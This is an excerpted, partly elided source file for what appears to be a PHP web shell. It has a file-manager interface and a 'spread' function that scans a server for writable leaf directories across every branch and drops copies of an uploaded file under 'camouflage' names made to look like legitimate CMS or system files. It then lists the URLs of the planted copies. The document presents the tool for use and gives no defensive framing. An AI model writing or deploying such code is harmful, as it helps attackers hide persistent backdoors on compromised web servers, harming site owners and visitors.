...
if(isset($_POST['action'])){
    ...
    if($act=='spread'&&isset($_FILES['file'])&&isset($_POST['root'])){
        ...
        // Random camouflage filename generator – looks like legit CMS/system files
        ...
        // Collect ALL leaf dirs (dirs with no subdirs) recursively
        function getAllLeafDirs($dir, &$leaves, $depth=0){
            if($depth>15) return; // safety cap
            $sub=[];
            $items=@scandir($dir);
            if(!$items) return;
            foreach($items as $it){
            ...
            if(empty($sub)){
                // Only add if this dir is writable
        ...
        // Get top-level branches directly under root
        ...
        // Strategy: collect deepest leaf dir from EACH top-level branch
        ...
        // If still fewer than $spreadCount, fill up with more leaf dirs from any branch
        ...
        // Last fallback: if root itself is writable and nothing found
...
.hc-v.acc{color:var(--a);}
.hc-v.warn{color:var(--y);}
...
.hsi-v.ok{color:var(--a);opacity:.9;}
.hsi-v.warn{color:var(--y);opacity:.9;}
.hsi-v.bad{color:var(--r);}
.hsi-v.plain{color:var(--p);opacity:.65;}
...
.ft th.tc{width:28px;padding:6px 0 6px 10px;}
.ft th.ts{width:76px;text-align:right;padding-right:12px;}
.ft th.tp{width:48px;}
.ft th.tm{width:132px;}
.ft th.ta{width:116px;}
...
.ft td.tc{width:28px;padding:5px 0 5px 10px;}
.ft td.ts{text-align:right;padding-right:12px;color:var(--d2);font-size:10.5px;font-variant-numeric:tabular-nums;}
.ft td.tp{color:var(--y);font-size:10.5px;opacity:.8;}
.ft td.tm{color:var(--d2);font-size:10.5px;}
.fr{transition:background .07s;}
.fr:hover{background:var(--s2);}
.fr.sel{background:rgba(224,82,82,.05);}
.fr.sel:hover{background:rgba(224,82,82,.09);}
...
.fr.dir .fi{color:#c8c8d0;}
.fr.dir .nm{color:#dddde8;font-weight:500;}
.fr.file .nm{color:#c8c8d4;}
.fr.no-read .nm{color:var(--r) !important;opacity:.8;}
.fr.no-read .fi{color:var(--r) !important;opacity:.6;}
.nm{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11.5px;}
.fag{display:flex;gap:2px;opacity:0;transition:opacity .1s;}
.fr:hover .fag{opacity:1;}
.fr.sel .fag{opacity:.1;pointer-events:none;}
...
.fab.fe:hover{color:var(--a);}
.fab.fd:hover{color:var(--y);}
.fab.fc:hover{color:var(--y);}
.fab.fr2:hover{color:var(--b);}
.fab.fx:hover{color:var(--r);}
...
.tline{word-break:break-all;}
.tline.cmd{color:var(--r);opacity:.85;}
.tline.out{color:var(--a);opacity:.8;}
...
.bg{border-color:var(--a);color:var(--a);background:transparent;}
.bg:hover{background:var(--a);color:#fff;}
.br{border-color:var(--r);color:var(--r);background:transparent;}
.br:hover{background:var(--r);color:#fff;}
...
.count-input{
  ...
  color:var(--p);border-radius:4px;font-family:var(--f);font-size:11px;
  outline:none;transition:border-color .1s;text-align:center;
...
.count-slider{
  ...
  height:3px;background:var(--bd2);border-radius:2px;outline:none;cursor:pointer;
}
...
.count-slider:hover::-webkit-slider-thumb{background:var(--ad);}
      ...
      <table class="ft">
        <thead>
          <tr>
            ...
            <th class="tn">Name</th>
            <th class="ts">Size</th>
            <th class="tp">Perms</th>
            <th class="tm">Modified</th>
            <th class="ta">Actions</th>
          </tr>
        </thead>
        <tbody id="fl">
    ...
    <div class="mbody">
      ...
      <form id="spreadForm" enctype="multipart/form-data">
        ...
        <div style="display:flex;gap:5px;margin-bottom:8px;align-items:center;">
          ...
          <button type="button" class="btn bg" style="flex-shrink:0;padding:5px 9px;font-size:10px;" onclick="spUseCWD()" title="Use current directory">
            <i class="fas fa-crosshairs"></i> CWD
          </button>
          <button type="button" class="btn bg" style="flex-shrink:0;padding:5px 9px;font-size:10px;" onclick="spUseDocRoot()" title="Use document root">
            <i class="fas fa-globe"></i> DOCROOT
          </button>
        </div>
        ...
        <!-- ── HOW MANY FILES (NEW) ── -->
        <div class="count-row">
          <label><i class="fas fa-layer-group" style="margin-right:4px;opacity:.6"></i>how many files:</label>
          ...
          <span class="count-hint" id="sp-count-hint">5 file &mdash; max 50</span>
        </div>
...
function post(data, cb, fail) {
  $.ajax({ url: SELF, method: 'POST', data: data, dataType: 'json',
    success: cb,
    error: function(x) { if(fail) fail(); else notify('Network error','err'); }
  });
}
function postForm(fd, cb) {
  $.ajax({ url: SELF, method: 'POST', data: fd,
...
function buildNav(path) {
  ...
  parts.forEach(function(p){
    cum += '/'+p;
    html += '<span class="psep">/</span><span class="pseg" data-p="'+he(cum)+'">'+he(p)+'</span>';
  });
  $('#pnav').html(html);
}
...
function navBack() {
  ...
  post({ action:'chdir', path:p }, function(r){
    if(r.ok){ CWD=r.path; buildNav(CWD); loadFiles(); }
    updNB();
  });
}
...
function ficon(n) {
  ...
  var m={
    php:'fa-code',html:'fa-code',htm:'fa-code',js:'fa-file-code',ts:'fa-file-code',
    css:'fa-file-code',json:'fa-file-code',xml:'fa-file-code',yml:'fa-file-code',yaml:'fa-file-code',
    txt:'fa-file-alt',log:'fa-file-alt',md:'fa-file-alt',ini:'fa-file-alt',cfg:'fa-file-alt',conf:'fa-file-alt',env:'fa-file-alt',
    jpg:'fa-file-image',jpeg:'fa-file-image',png:'fa-file-image',gif:'fa-file-image',svg:'fa-file-image',webp:'fa-file-image',
    zip:'fa-file-archive',rar:'fa-file-archive',gz:'fa-file-archive','7z':'fa-file-archive',tar:'fa-file-archive',
    sh:'fa-terminal',bash:'fa-terminal',py:'fa-file-code',rb:'fa-file-code',pl:'fa-file-code',sql:'fa-database',
    pdf:'fa-file-pdf',doc:'fa-file-word',docx:'fa-file-word',xls:'fa-file-excel',xlsx:'fa-file-excel',
    mp4:'fa-file-video',mkv:'fa-file-video',avi:'fa-file-video',mp3:'fa-file-audio',wav:'fa-file-audio'
  };
...
function loadFiles() {
  ...
  post({ action:'ls' }, function(r) {
    if(!r||!r.ok){
      $('#fl').html('<tr class="load-r"><td colspan="'+cols+'"><i class="fas fa-lock"></i> '+(r&&r.err?he(r.err):'Error')+'</td></tr>');
      return;
    }
    CWD = r.path; buildNav(CWD);
    var files = r.files||[];
    if(!files.length){
      $('#fl').html('<tr class="load-r"><td colspan="'+cols+'"><i class="fas fa-inbox"></i> Empty directory</td></tr>');
      return;
    }
    ...
    for(var i=0; i<files.length; i++){
      ...
      html += '<td class="ts">'+sz+'</td>';
      html += '<td class="tp">'+he(f.perm)+'</td>';
      html += '<td class="tm">'+he(f.time)+'</td>';
    ...
    $('#fl').html('<tr class="load-r"><td colspan="'+(SEL?6:5)+'"><i class="fas fa-exclamation-triangle"></i> Failed to load</td></tr>');
  });
}

/* ── EVENT DELEGATION ── */
$(document).on('click', '.fr .fn', function(e) {
  var row=$(this).closest('.fr');
  var fp=row.data('fp'), isdir=parseInt(row.data('isdir'),10);
  if(SEL){
    var chk=row.find('.fchk');
    chk.prop('checked',!chk.prop('checked'));
    row.toggleClass('sel',chk.prop('checked'));
    updSelCnt(); return;
  }
...
$(document).on('change','.fchk',function(){
  $(this).closest('.fr').toggleClass('sel',$(this).prop('checked'));
  updSelCnt();
});
...
function toggleSel(){
  SEL=!SEL;
  $('#selBtn').toggleClass('sel-on',SEL);
  document.getElementById('thc').style.display=SEL?'':'none';
  $('#bbar').toggleClass('on',SEL);
  loadFiles();
}
...
function updSelCnt(){
  var n=$('.fchk:checked').length;
  $('#selCnt').text(n);
  if(n>0){
    document.getElementById('bdelBtn').classList.add('on');
    document.getElementById('bcopyBtn').classList.add('on');
  } else {
    document.getElementById('bdelBtn').classList.remove('on');
    document.getElementById('bcopyBtn').classList.remove('on');
  }
  if(CLIPBOARD.length>0){
    document.getElementById('bpasteBtn').classList.add('on');
  } else {
    document.getElementById('bpasteBtn').classList.remove('on');
  }
}
...
function doBulkDel(){
  var fps=[];
  $('.fchk:checked').each(function(){ fps.push($(this).closest('.fr').data('fp')); });
...
function doBulkCopy(){
  ...
  if(!fps.length) return;
  CLIPBOARD=fps;
  notify(fps.length+' item(s) copied to clipboard');
  updSelCnt();
}
function doBulkPaste(){
  ...
  post({ action:'copy', files:JSON.stringify(CLIPBOARD), dest:CWD },function(r){
    if(r){
      r.failed>0 ? notify('Pasted '+r.copied+', failed '+r.failed,'err') : notify('Pasted '+r.copied+' item(s)');
    }
    loadFiles();
  });
}
...
function doEdit(fp){
  SF=fp;
  $('#editT').html('<i class="fas fa-edit"></i> '+he(fp.split('/').pop()));
  $('#editC').val('Loading...');
  openM('edit');
...
$('#uploadForm').on('submit',function(e){
  e.preventDefault();
  var fd=new FormData(this); fd.append('action','upload');
...
/* ── NEW FILE/DIR ── */
function doNewfile(){
  var n=$('#nf-name').val().trim();
  if(!n){ notify('Enter filename','err'); return; }
...
function doNewdir(){
  var n=$('#nd-name').val().trim();
  if(!n){ notify('Enter name','err'); return; }
...
function syncCount(src){
  ...
  src.value = v;
  if(src.id==='sp-count'){
    document.getElementById('sp-slider').value = v;
  } else {
    document.getElementById('sp-count').value = v;
  }
  var hint = v===1 ? '1 file' : v+' file';
  hint += ' &mdash; max 50';
  document.getElementById('sp-count-hint').innerHTML = hint;
}
...
function spUseCWD(){
  $('#sp-root').val(CWD);
  $('#spRootHint').html('<i class="fas fa-check-circle" style="color:var(--a);margin-right:3px"></i>Set to current working directory: <span style="color:var(--a)">'+he(CWD)+'</span>');
}
function spUseDocRoot(){
  var dr = DOCROOT_PHP || CWD;
  $('#sp-root').val(dr);
  $('#spRootHint').html('<i class="fas fa-check-circle" style="color:var(--a);margin-right:3px"></i>Set to document root: <span style="color:var(--a)">'+he(dr)+'</span>');
}
...
function closeSpread(){
  ...
  $('#sp-count').val(5);
  $('#sp-slider').val(5);
  $('#sp-count-hint').html('5 file &mdash; max 50');
  $('#spRootHint').html('');
  $('#spLog').hide();
  $('#spLogItems').html('');
  $('#spLogCount').text('');
...
// Pre-fill root with CWD when modal opens
$(document).on('click', '.qa-spread', function(){
  if(!$('#sp-root').val()){
    $('#sp-root').val(CWD);
    $('#spRootHint').html('<i class="fas fa-info-circle" style="color:var(--d2);margin-right:3px"></i>Default: current dir. Change to any absolute path, e.g. <span style="color:var(--d2)">/home/user/public_html</span>');
  }
});
...
$('#spreadForm').on('submit', function(e){
  ...
  $('#spProg').show();
  $('#spBar').css('width','15%');
  $('#spStat').show().html('Scanning <span style="color:var(--a)">'+he(root)+'</span> &mdash; target <b>'+countVal+'</b> file(s)...');
  $('#spLog').hide();
  ...
  $.ajax({
    ...
    xhr: function(){
      ...
      if(x.upload) x.upload.addEventListener('progress', function(ev){
        if(ev.lengthComputable){
          var pct = Math.min(75, Math.round(ev.loaded/ev.total*75));
          $('#spBar').css('width', pct+'%');
        }
      }, false);
      return x;
    ...
    success: function(r){
      $('#spBar').css('width','100%');
      setTimeout(function(){ $('#spProg').hide(); },400);

      if(!r||!r.ok){
        $('#spStat').html('<span style="color:var(--r)"><i class="fas fa-times-circle" style="margin-right:4px"></i>'+(r&&r.msg?he(r.msg):'Spread failed')+'</span>');
        $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Now');
        return;
      }

      var ok=r.spread||0, fail=r.failed||0, res=r.results||[];
      var branches = r.total_branches||0;
      var requested = r.count_requested || countVal;
      $('#spStat').html(
        'Spread <b>'+ok+'</b> / <b>'+requested+'</b> file'+(requested!==1?'s':'')+
        (branches?' across <b>'+branches+'</b> branch'+(branches!==1?'es':''):'')+
        (fail>0?' &mdash; <span style="color:var(--r)">'+fail+' failed</span>':'')
      );
      ...
      res.forEach(function(item){
        if(item.ok){
          var dirShort = item.dir ? item.dir.replace(/\\/g,'/').split('/').slice(-4).join('/') : '';
          html+='<div class="sl-item">'
            +'<div class="sl-fname"><i class="fas fa-folder-open" style="margin-right:4px;opacity:.4;color:var(--d2)"></i>'
            +'<span style="color:var(--d);font-size:9px">.../'+(dirShort?he(dirShort):'?')+'</span></div>'
            +'<div class="sl-fname" style="margin-top:1px"><i class="fas fa-file-code" style="margin-right:4px;opacity:.5"></i>'+he(item.fname)+'</div>'
            +'<div class="sl-url" onclick="copyUrl(this.dataset.url)" data-url="'+he(item.url)+'" title="Click to copy">'
            +'<i class="fas fa-link" style="margin-right:4px;opacity:.5;font-size:9px"></i>'+he(item.url)+'</div>'
            +'</div>';
        } else {
          var dirShort2 = item.dir ? item.dir.replace(/\\/g,'/').split('/').slice(-4).join('/') : '';
          html+='<div class="sl-item">'
            +'<div class="sl-fname"><i class="fas fa-folder-open" style="margin-right:4px;opacity:.4;color:var(--d2)"></i>'
            +'<span style="color:var(--d);font-size:9px">.../'+(dirShort2?he(dirShort2):'?')+'</span></div>'
            +'<div class="sl-fname" style="margin-top:1px"><i class="fas fa-file-code" style="margin-right:4px;opacity:.5"></i>'+he(item.fname)+'</div>'
            +'<div class="sl-fail"><i class="fas fa-times-circle" style="margin-right:4px"></i>Failed</div>'
            +(item.err?'<div class="sl-err">'+he(item.err)+'</div>':'')
            +'</div>';
        }
      });
      $('#spLogItems').html(html);
      $('#spLog').show();
      $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Again');
    },
    error: function(){
      $('#spProg').hide();
      $('#spStat').html('<span style="color:var(--r)"><i class="fas fa-times-circle" style="margin-right:4px"></i>Network error</span>');
      $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Now');
    }
  });
});
...
function copyUrl(url){
  if(navigator.clipboard){
    navigator.clipboard.writeText(url).then(function(){ notify('URL copied'); });
  } else {
